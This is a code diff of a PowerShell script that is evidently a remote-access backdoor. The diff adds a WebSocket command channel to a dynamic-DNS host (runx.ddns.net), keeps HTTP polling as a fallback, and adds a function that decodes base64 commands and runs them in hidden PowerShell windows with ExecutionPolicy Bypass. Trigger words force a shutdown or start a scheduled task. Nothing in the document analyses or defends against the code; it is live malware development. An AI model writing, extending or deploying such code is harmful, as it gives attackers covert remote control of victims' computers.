@@ -8,6 +8,7 @@ if (-not $m2.WaitOne(0)) {
 	exit
 }
 
+$VPS_WS_URL = "ws://runx.ddns.net/ws/client"
 $VPS_POLL_URL = "http://runx.ddns.net/api/poll"
 $IdPath = "$env:APPDATA\Microsoft\run\run.txt"
 
@@ -27,58 +28,100 @@ else {
 
 $uniqueUser = "$($env:USERNAME)-$uniqueId-W"
 
+function Execute-CommandPayload ($r) {
+	if ($r.run -eq $true -and -not [string]::IsNullOrEmpty($r.cmd)) {
+		$c = [System.Text.Encoding]::UTF8.GetString(
+			[System.Convert]::FromBase64String($r.cmd)
+		)
+
+		if ($c -match "panic") {
+			exit
+		}
+		elseif ($c -match "altf4") {
+			Start-Process `
+				-FilePath "shutdown" `
+				-ArgumentList "/s", "/t", "0" `
+				-WindowStyle Hidden
+		}
+		elseif ($c -match "sauce") {
+			Start-ScheduledTask `
+				-TaskName "WinRunInstaller"
+		}
+		else {
+			$style = if ($r.visible -eq $true) {
+				"Normal"
+			}
+			else {
+				"Hidden"
+			}
+
+			Start-Process powershell.exe `
+				-ArgumentList @(
+				"-NoProfile",
+				"-ExecutionPolicy",
+				"Bypass",
+				"-Command",
+				$c
+			) -WindowStyle $style
+		}
+	}
+}
+
 try {
 	while ($true) {
 		try {
-			$u = $VPS_POLL_URL + "?username=" +
-			[System.Uri]::EscapeDataString($uniqueUser)
+			$wsUri = "$VPS_WS_URL?username=" + [System.Uri]::EscapeDataString($uniqueUser)
+			$ws = New-Object System.Net.WebSockets.ClientWebSocket
+			$cts = New-Object System.Threading.CancellationTokenSource
+			$cts.CancelAfter(10000)
 
-			$uri = New-Object System.Uri($u)
+			$ws.ConnectAsync((New-Object System.Uri($wsUri)), $cts.Token).Wait()
 
-			$r = Invoke-RestMethod `
-				-Method Get `
-				-Uri $uri `
-				-TimeoutSec 10
+			if ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
+				$buffer = [System.ArraySegment[byte]]::new((New-Object byte[] 8192))
+				$lastPing = [DateTime]::UtcNow
 
-			if ($r.run -eq $true) {
-				$c = [System.Text.Encoding]::UTF8.GetString(
-					[System.Convert]::FromBase64String($r.cmd)
-				)
-
-				if ($c -match "panic") {
-					exit
-				}
-				elseif ($c -match "altf4") {
-					Start-Process `
-						-FilePath "shutdown" `
-						-ArgumentList "/s", "/t", "0" `
-						-WindowStyle Hidden
-				}
-				elseif ($c -match "sauce") {
-					Start-ScheduledTask `
-						-TaskName "WinRunInstaller"
-				}
-				else {
-					$style = if ($r.visible -eq $true) {
-						"Normal"
-					}
-					else {
-						"Hidden"
+				while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
+					if (([DateTime]::UtcNow - $lastPing).TotalSeconds -ge 15) {
+						$pingBytes = [System.Text.Encoding]::UTF8.GetBytes('{"type":"ping"}')
+						$pingSeg = [System.ArraySegment[byte]]::new($pingBytes)
+						$ws.SendAsync($pingSeg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
+						$lastPing = [DateTime]::UtcNow
 					}
 
-					Start-Process powershell.exe `
-						-ArgumentList @(
-						"-NoProfile",
-						"-ExecutionPolicy",
-						"Bypass",
-						"-Command",
-						$c
-					) -WindowStyle $style
+					$ms = New-Object System.IO.MemoryStream
+					do {
+						$receiveTask = $ws.ReceiveAsync($buffer, [System.Threading.CancellationToken]::None)
+						if (-not $receiveTask.Wait(3000)) {
+							break
+						}
+						$result = $receiveTask.Result
+						if ($result.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
+							$ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "", [System.Threading.CancellationToken]::None).Wait()
+							break
+						}
+						if ($result.Count -gt 0) {
+							$ms.Write($buffer.Array, $buffer.Offset, $result.Count)
+						}
+					} while (-not $result.EndOfMessage)
+
+					if ($ms.Length -gt 0) {
+						$jsonStr = [System.Text.Encoding]::UTF8.GetString($ms.ToArray())
+						$r = $jsonStr | ConvertFrom-Json
+						Execute-CommandPayload $r
+					}
 				}
 			}
 		}
-		catch {}
-		Start-Sleep -Seconds 3
+		catch {
+			try {
+				$u = $VPS_POLL_URL + "?username=" + [System.Uri]::EscapeDataString($uniqueUser)
+				$r = Invoke-RestMethod -Method Get -Uri (New-Object System.Uri($u)) -TimeoutSec 5
+				Execute-CommandPayload $r
+			}
+			catch {}
+		}
+		Start-Sleep -Seconds 2
 	}
 }
 finally {
@@ -92,3 +135,4 @@ finally {
 		$m2.Dispose()
 	}
 }
+
